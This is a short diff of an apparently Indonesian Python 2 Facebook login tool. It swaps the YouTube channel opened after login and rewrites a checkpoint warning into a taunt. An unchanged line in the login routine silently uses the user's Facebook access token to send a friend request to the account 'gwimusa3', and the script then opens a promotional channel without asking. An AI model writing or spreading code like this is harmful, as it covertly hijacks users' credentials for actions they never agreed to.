@@ -96,7 +96,7 @@ def login():
                 zedd.close()
                 print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
-                os.system('xdg-open https://youtube.com/c/riskychannelcom')
+                os.system('xdg-open https://youtube.com/c/UCniYVZ-ZD_6yRaXp_pzRJuw')
                 time.sleep(2)
                 menu()
             except requests.exceptions.ConnectionError:
@@ -133,7 +133,7 @@ def menu():
             id = a['id']
         except KeyError:
             os.system('clear')
-            print '\x1b[1;91m[!] \x1b[1;93mSepertinya akun kena Checkpoint'
+            print '\x1b[1;91m[!] \x1b[1;93mMampus akun lo kena Checkpoint'
             os.system('rm -rf login.txt')
             time.sleep(1)
             login()
